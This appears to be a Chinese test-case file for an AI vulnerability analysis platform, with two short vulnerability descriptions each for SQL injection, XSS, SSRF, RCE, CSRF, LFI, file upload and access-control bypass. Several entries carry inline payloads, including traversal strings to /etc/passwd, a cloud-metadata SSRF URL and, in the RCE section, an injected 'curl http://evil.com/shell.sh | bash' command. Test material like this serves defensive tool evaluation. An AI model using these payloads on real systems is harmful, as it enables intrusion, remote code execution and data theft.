# AI 漏洞分析平台 — 手动漏洞描述测试用例
# 覆盖 8 种常见漏洞类型，每类 2 条

## SQLi
在登录页面的用户名输入框中输入单引号(')后返回了 MySQL 错误信息"Unknown column 'xxx' in 'where clause'"，疑似存在 SQL 注入漏洞。攻击者可构造 UNION SELECT 语句绕过认证或窃取用户数据，影响范围包括用户表、订单表和后台管理表。

商品搜索接口的参数 keyword 未做过滤，输入 1' OR '1'='1 后返回了全部商品列表。该漏洞属于数字型 SQL 注入，攻击者可能通过该接口拖取整张数据表，造成严重的信息泄露。

## XSS
用户个人资料的"个人简介"字段未对 HTML 标签做转义处理，可直接插入 `<script>alert(document.cookie)</script>` 并在其他用户浏览时执行。该存储型 XSS 可被利用于窃取 Session Cookie、劫持用户会话、钓鱼攻击等。

网站全局搜索框将用户输入的关键词回显到搜索结果页面，且未进行 HTML 实体编码。输入 `<img src=x onerror=alert(1)>` 后弹窗，属于反射型 XSS 漏洞，攻击者可构造恶意链接发送给受害者。

## SSRF
后台管理系统提供的"远程图片抓取"功能，接收用户输入的 URL 并通过服务端 curl 请求。输入 `http://169.254.169.254/latest/meta-data/` 后返回了 AWS 元数据信息，暴露出内网 IP、IAM 角色凭证等敏感信息。

数据报表模块的"导出 PDF"功能，服务端使用 wkhtmltopdf 渲染用户提供的 HTML 模板 URL。攻击者可传入 `file:///etc/passwd` 读取本地文件，或传入内网地址探测内部服务。

## RCE
文件上传接口未校验文件类型，允许上传 .php / .jsp / .py 等可执行脚本。上传 webshell 后可通过 HTTP 直接访问并执行任意系统命令，如 `whoami`、`cat /etc/shadow`，可完全控制服务器。

后台管理系统的"数据库备份"功能，接收用户输入的表名并通过 shell_exec 拼接命令执行。输入 `users; curl http://evil.com/shell.sh | bash` 触发命令注入，攻击者可获得反向 Shell。

## CSRF
用户密码修改接口未验证 Referer 头且未使用 CSRF Token。攻击者可构造一个自动提交的表单页面，诱导已登录用户访问后悄无声息地将其密码改为攻击者已知的密码。

管理员删除用户接口 /api/admin/user/delete 仅依赖 Session Cookie 认证，未做 CSRF 防护。攻击者可在第三方页面中嵌入隐藏的 \<img\> 标签指向删除接口，管理员访问即触发。

## LFI
网站的"帮助文档"功能通过 URL 参数 `?page=about` 包含 PHP 文件，路径未校验。输入 `?page=../../../../etc/passwd` 后返回了系统密码文件内容，属于路径穿越漏洞。

日志查看接口 `/viewLog?file=app.log` 未限制可访问目录，输入 `?file=../../../var/log/auth.log` 可读取任意日志文件，泄露用户登录 IP、SSH 尝试记录等敏感运维信息。

## 文件上传漏洞
头像上传功能仅在前端做类型校验（accept="image/*"），后端未验证 MIME 类型和文件内容。上传包含 PHP 代码的 `.php.jpg` 双扩展名文件可绕过过滤，获得 WebShell 权限。

批量导入用户接口接收 Excel 文件，但未限制上传大小和数量。攻击者可上传包含百万行恶意宏代码的 .xlsm 文件，消耗服务器内存导致 OOM，或触发宏执行。

## 权限绕过
订单详情 API `/api/order/{id}` 仅校验登录态而未经归属校验。普通用户修改 URL 中的订单 ID 即可查看其他用户的订单详情，包括姓名、地址、手机号等个人隐私信息。

后台管理路径 `/admin` 虽未在前端暴露链接，但攻击者通过路径枚举即可直接访问。管理后台未做 IP 白名单限制，从公网可直接登录，存在暴力破解风险。
